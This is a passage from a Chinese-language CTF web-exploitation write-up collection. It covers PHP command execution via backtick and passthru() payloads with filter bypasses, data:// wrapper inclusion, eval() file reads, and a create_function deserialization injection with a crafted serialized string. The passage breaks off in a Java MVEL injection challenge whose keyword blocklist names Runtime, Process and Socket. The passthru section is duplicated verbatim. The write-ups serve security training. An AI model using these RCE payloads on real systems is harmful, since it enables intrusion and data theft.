<a id="__codelineno-16-27" name="__codelineno-16-27" href="#__codelineno-16-27"></a><span class="k">switch</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"action"</span><span class="p">]</span> <span class="o">??</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
<a id="__codelineno-16-28" name="__codelineno-16-28" href="#__codelineno-16-28"></a>    <span class="k">case</span> <span class="s1">'pwd'</span><span class="o">:</span>
<a id="__codelineno-16-29" name="__codelineno-16-29" href="#__codelineno-16-29"></a>        <span class="k">echo</span> <span class="nv">$dir</span><span class="p">;</span>
<a id="__codelineno-16-30" name="__codelineno-16-30" href="#__codelineno-16-30"></a>        <span class="k">break</span><span class="p">;</span>
<a id="__codelineno-16-31" name="__codelineno-16-31" href="#__codelineno-16-31"></a>    <span class="k">case</span> <span class="s1">'upload'</span><span class="o">:</span>
<a id="__codelineno-16-32" name="__codelineno-16-32" href="#__codelineno-16-32"></a>        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]</span> <span class="o">??</span> <span class="s2">""</span><span class="p">;</span>
<a id="__codelineno-16-33" name="__codelineno-16-33" href="#__codelineno-16-33"></a>        <span class="nx">waf</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
<a id="__codelineno-16-34" name="__codelineno-16-34" href="#__codelineno-16-34"></a>        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"</span><span class="si">$dir</span><span class="s2">"</span> <span class="o">.</span> <span class="s2">"index.php"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
<a id="__codelineno-16-35" name="__codelineno-16-35" href="#__codelineno-16-35"></a><span class="p">}</span>
<a id="__codelineno-16-36" name="__codelineno-16-36" href="#__codelineno-16-36"></a><span class="cp">?&gt;</span>
</code></pre></div>
<p>先看看路径是什么</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67d8260f88c538a9b5bff9f2.png"></p>
<p>我们需要知道这个目录下有什么，但是常见的 eval() 函数被过滤了</p>
<p>使用 `` 包裹命令，这样 PHP 就会将里面的内容当成命令执行</p>
<p>最后使用 <code>&lt;?=</code> 输出，同时 <code>\t</code> 绕过空格</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="x">?action=upload&amp;data=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="sb">`ls\t/`</span><span class="cp">?&gt;</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/67d8277888c538a9b5bffa4d.png"></p>
<p>访问文件拿到 flag</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>?action=upload&amp;data=&lt;?=`cat\t/flllllll1112222222lag`?&gt;
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/67d8279888c538a9b5bffa5d.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-17.md -->
<h3 id="passthru-rce">passthru() RCE<a class="headerlink" href="#passthru-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e2303b0ba3d5a1d7e307f6.png"></p>
<p>打开网页</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e230a90ba3d5a1d7e3080f.png"></p>
<p>随便传入一个参数</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>http://114.67.175.224:16452/?sss
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e231140ba3d5a1d7e3081c.png"></p>
<p>源码解析下就是最后我们传入的参数值会被执行</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e231a20ba3d5a1d7e3082d.png"></p>
<p>使用 <code>passthru()</code> 去执行命令</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e231c90ba3d5a1d7e30838.png"></p>
<p>虽然 <code>cat</code> 被过滤了，但还可以用 <code>more</code> 代替</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e231f60ba3d5a1d7e30844.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-18.md -->
<h3 id="more-cat">more 代替 cat 绕过<a class="headerlink" href="#more-cat" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e2303b0ba3d5a1d7e307f6.png"></p>
<p>打开网页</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e230a90ba3d5a1d7e3080f.png"></p>
<p>随便传入一个参数</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>http://114.67.175.224:16452/?sss
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e231140ba3d5a1d7e3081c.png"></p>
<p>源码解析下就是最后我们传入的参数值会被执行</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e231a20ba3d5a1d7e3082d.png"></p>
<p>使用 <code>passthru()</code> 去执行命令</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e231c90ba3d5a1d7e30838.png"></p>
<p>虽然 <code>cat</code> 被过滤了，但还可以用 <code>more</code> 代替</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67e231f60ba3d5a1d7e30844.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-19.md -->
<h3 id="data-rce">data 伪协议 RCE<a class="headerlink" href="#data-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/6808c71f58cb8da5c8c67481.png"></p>
<p>打开网页给出了源代码</p>
<p><code>strstr()</code> 用于查找字符串首次出现的位置（区分大小写）</p>
<p><code>str_replace()</code> 以其他字符替换字符串中的一些字符（区分大小写）</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'hello'</span><span class="p">];</span>
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="nv">$page</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="k">while</span> <span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="s2">"php://"</span><span class="p">))</span> <span class="p">{</span>
<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>    <span class="nv">$page</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"php://"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$page</span><span class="p">);</span>
<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="p">}</span>
<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="k">include</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="cp">?&gt;</span>
</code></pre></div>
<p>虽然禁用了 <code>php://</code> 伪协议，但是 <code>data://</code> 还可以使用</p>
<p>如果传入的数据是 PHP 代码，就会执行代码，用法如下：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="x">data://text/plain;base64,xxxx(base64 编码后的数据)</span>
</code></pre></div>
<p>或者</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="x">data://text/plain,xxx(数据)</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/6808cbee58cb8da5c8c681d5.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-2.md -->
<h3 id="eval-rce">eval() RCE<a class="headerlink" href="#eval-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16d3cd0e0a243d4ffc114.jpg"></p>
<p>eval() 函数把字符串按照 PHP 代码来执行，var_dump() 函数用于输出变量的相关信息</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16d4bd0e0a243d4ffc115.jpg"></p>
<p>可以使用 file() 函数把整个文件读入一个数组中</p>
<p>通过 eval 函数执行，传参 ?hello=file('flag.php')，拿到 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16d22d0e0a243d4ffc110.jpg"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-20.md -->
<h3 id="create_function-rce">Create_function() RCE<a class="headerlink" href="#create_function-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/6810303458cb8da5c8d2bb2b.png"></p>
<p>打开网页给出了源码</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'p'</span><span class="p">]))</span> <span class="p">{</span>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>    <span class="nv">$p</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'p'</span><span class="p">]);</span>
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="p">}</span>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="nb">show_source</span><span class="p">(</span><span class="s2">"index.php"</span><span class="p">);</span>
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>
<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="k">class</span> <span class="nc">Noteasy</span>
<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="p">{</span>
<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>    <span class="k">private</span> <span class="nv">$a</span><span class="p">;</span>
<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>    <span class="k">private</span> <span class="nv">$b</span><span class="p">;</span>
<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>
<a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>    <span class="c1">// 构造函数，会在类的对象在创建时自动调用</span>
<a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span>
<a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>    <span class="p">{</span>
<a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
<a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
<a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">(</span><span class="nv">$a</span><span class="o">.</span><span class="nv">$b</span><span class="p">);</span>
<a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>        <span class="k">eval</span><span class="p">(</span><span class="nv">$a</span><span class="o">.</span><span class="nv">$b</span><span class="p">);</span>
<a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>    <span class="p">}</span>
<a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>
<a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>
<a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>    <span class="c1">// 析构函数，在对象销毁时自动调用</span>
<a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
<a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a>    <span class="p">{</span>
<a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a>        <span class="nv">$a</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
<a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a>        <span class="nv">$b</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">;</span>
<a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">(</span><span class="nv">$a</span><span class="o">.</span><span class="nv">$b</span><span class="p">);</span>
<a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a>        <span class="nv">$a</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>
<a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a>    <span class="p">}</span>
<a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a>
<a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a>
<a id="__codelineno-24-33" name="__codelineno-24-33" href="#__codelineno-24-33"></a>    <span class="k">private</span> <span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
<a id="__codelineno-24-34" name="__codelineno-24-34" href="#__codelineno-24-34"></a>    <span class="p">{</span>
<a id="__codelineno-24-35" name="__codelineno-24-35" href="#__codelineno-24-35"></a>        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match_all</span><span class="p">(</span><span class="s2">"(ls|find|cat|grep|head|tail|echo)"</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">"You are a hacker, get out"</span><span class="p">);</span>
<a id="__codelineno-24-36" name="__codelineno-24-36" href="#__codelineno-24-36"></a>    <span class="p">}</span>
<a id="__codelineno-24-37" name="__codelineno-24-37" href="#__codelineno-24-37"></a>
<a id="__codelineno-24-38" name="__codelineno-24-38" href="#__codelineno-24-38"></a>
<a id="__codelineno-24-39" name="__codelineno-24-39" href="#__codelineno-24-39"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">setAB</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span>
<a id="__codelineno-24-40" name="__codelineno-24-40" href="#__codelineno-24-40"></a>    <span class="p">{</span>
<a id="__codelineno-24-41" name="__codelineno-24-41" href="#__codelineno-24-41"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
<a id="__codelineno-24-42" name="__codelineno-24-42" href="#__codelineno-24-42"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
<a id="__codelineno-24-43" name="__codelineno-24-43" href="#__codelineno-24-43"></a>    <span class="p">}</span>
<a id="__codelineno-24-44" name="__codelineno-24-44" href="#__codelineno-24-44"></a><span class="p">}</span>
</code></pre></div>
<p>首先，反序列化不调用构造函数</p>
<p>因为反序列化时通过读取对象的字节流来恢复对象的状态，而不是通过调用对象的构造函数来创建对象</p>
<p>所以直接来看析构函数</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="x">public function __destruct()</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="x">{</span>
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="x">    // 将属性 $a 转换为字符串</span>
<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="x">    $a = (string)$this-&gt;a;</span>
<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>
<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="x">    // 将属性 $b 转换为字符串</span>
<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="x">    $b = (string)$this-&gt;b;</span>
<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>
<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="x">    // 调用 check 方法，传入 $a 和 $b 连接后的字符串</span>
<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="x">    $this-&gt;check($a.$b);</span>
<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>
<a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="x">    // 重点代码</span>
<a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a><span class="x">    // 将 $a 作为函数调用，第一个参数为空字符串，第二个参数为 $b</span>
<a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a><span class="x">    $a("", $b);</span>
<a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a><span class="x">}</span>
</code></pre></div>
<p>但是空的函数不能执行，所以我们要构造一个</p>
<p>这里要利用 <code>Create_function()</code> 函数</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="x">$func = create_function('$a, $b', 'return $a + $b;');</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="x">echo $func(2, 3); // 输出 5</span>
</code></pre></div>
<p><code>create_function</code> 实际上会在内部执行以下操作：</p>
<ol>
<li>生成一个唯一的函数名(如 <code>__lambda_func</code>)</li>
<li>用给定的参数和代码体创建一个新函数</li>
<li>返回这个函数名以便后续调用</li>
</ol>
<p>构造序列化代码</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="k">Class</span> <span class="nc">Noteast</span><span class="p">{</span>
<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>
<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="k">Private</span> <span class="nv">$a</span><span class="p">;</span>
<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>
<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="k">Private</span> <span class="nv">$b</span><span class="p">;</span>
<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>
<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="k">Public</span> <span class="nx">function_construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">){</span>
<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a>
<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="nv">$a</span><span class="p">;</span>
<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a>
<a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="o">=</span><span class="nv">$b</span><span class="p">;</span>
<a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a>
<a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a><span class="p">}</span>
<a id="__codelineno-27-16" name="__codelineno-27-16" href="#__codelineno-27-16"></a>
<a id="__codelineno-27-17" name="__codelineno-27-17" href="#__codelineno-27-17"></a><span class="nv">$object</span><span class="o">=</span><span class="k">new</span> <span class="nx">Noteasy</span><span class="p">(</span><span class="s2">"create_function"</span><span class="p">,</span><span class="s1">';}highlight_file("/flag");/*;'</span><span class="p">);</span>
<a id="__codelineno-27-18" name="__codelineno-27-18" href="#__codelineno-27-18"></a>
<a id="__codelineno-27-19" name="__codelineno-27-19" href="#__codelineno-27-19"></a><span class="k">Echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$object</span><span class="p">);</span>
<a id="__codelineno-27-20" name="__codelineno-27-20" href="#__codelineno-27-20"></a>
<a id="__codelineno-27-21" name="__codelineno-27-21" href="#__codelineno-27-21"></a><span class="p">}</span>
</code></pre></div>
<p>这样相当于</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="x">create_function('', ';}highlight_file("/flag");/*;')</span>
</code></pre></div>
<p>实际创建的代码为</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="x">function __lambda_func() {</span>
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="x">    ;}highlight_file("/flag");/*;</span>
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="x">}</span>
</code></pre></div>
<p>得到</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="x">O:7:"Noteasy":2:{s:10:"Noteasya";s:15:"create_function";s:10:"Noteasyb";s:21:';}highlight_file("/flag");/*;";}</span>
</code></pre></div>
<p>需要注意因为是 <code>private</code> 属性，所以不能直接使用</p>
<p>应该为 <code>\00类名\00</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="x">O:7:"Noteasy":2:{s:10:"\00Noteasy\00a";s:15:"create_function";s:10:"\00Noteasy\00b";s:29:";}highlight_file("/flag");/*";}</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/6810301658cb8da5c8d2bb1a.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-21.md -->
<h3 id="java-mvel">Java MVEL 表达式注入<a class="headerlink" href="#java-mvel" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/681079d158cb8da5c8d3dfa5.png"></p>
<p>打开页面只有这一个功能可用</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/681085c058cb8da5c8d415aa.png"></p>
<p>在 Burp 中发现响应有个 <code>source</code></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6810860b58cb8da5c8d417c4.png"></p>
<p>访问拿到源码</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6810863858cb8da5c8d41915.png"></p>
<p>使用 <code>@RestController</code> 注解，表示这是一个 Spring MVC 控制器，返回值会自动转换为 JSON 响应</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nd">@RestController</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MVELTest</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="w">    </span><span class="c1">// 类内容</span>
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="p">}</span>
</code></pre></div>
<p>初始化一个 <code>Setting</code> 对象，包含默认的 IP 列表和数字参数 6</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="kd">private</span><span class="w"> </span><span class="n">Setting</span><span class="w"> </span><span class="n">setting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Setting</span><span class="p">(</span><span class="s">"['115.195.167.159', '115.195.167.159', '164.90.230.201', '174.87.232.68']"</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">);</span>
</code></pre></div>
<p>处理 POST 请求，路径为 <code>/updateSysSetting</code></p>
<p>接收 JSON 格式的 <code>Setting</code> 对象作为请求体</p>
<p>返回 JSON 响应，字符编码为 UTF-8</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nd">@PostMapping</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"/updateSysSetting"</span><span class="p">,</span><span class="w"> </span><span class="n">produces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"application/json;charset=UTF-8"</span><span class="p">)</span>
<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="kd">public</span><span class="w"> </span><span class="n">ResponseObj</span><span class="w"> </span><span class="nf">updateSysSetting</span><span class="p">(</span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">Setting</span><span class="w"> </span><span class="o">[</span><span class="n">ES</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="w">    </span><span class="c1">// 方法实现</span>
<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="p">}</span>
</code></pre></div>
<p>使用正则表达式检测传入的表达式是否包含危险关键词（如 Runtime、Process 等）</p>
<p>如果检测到恶意代码，返回 483 状态码和错误信息</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Pattern</span><span class="p">.</span><span class="na">matches</span><span class="p">(</span><span class="s">""</span><span class="p">{</span><span class="o">?</span><span class="n">i</span><span class="p">}.</span><span class="o">*</span><span class="p">(</span><span class="n">system</span><span class="o">[</span><span class="n">Runtime</span><span class="o">|</span><span class="n">Process</span><span class="o">|</span><span class="n">Thread</span><span class="o">|</span><span class="n">Lookup</span><span class="o">|</span><span class="n">http</span><span class="o">|</span><span class="n">Socket</span><span class="o">|</span><span class="n">restTemplate</span><span class="o">|</span><span class="n">MVEL</span><span class="o">|</span><span class="n">flag</span><span class="o">]</span><span class="p">.</span><span class="o">*</span><span class="s">", [ES].getExp()) {</span>
<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="s">    response.setStatus(483);</span>
<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="s">    return new ResponseObj(false, "</span><span class="n">表达式包含恶意代码</span><span class="s">", "");</span>
<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="s">}</span>
</code></pre></div>
<p>使用 MVEL 引擎执行传入的表达式</p>
<p>捕获并处理执行过程中的异常</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="w">    </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MVEL</span><span class="p">.</span><span class="na">expl</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="na">getExp</span><span class="p">());</span>
<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="na">toString</span><span class="p">());</span>
<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="na">setStatus</span><span class="p">(</span><span class="mi">580</span><span class="p">);</span>
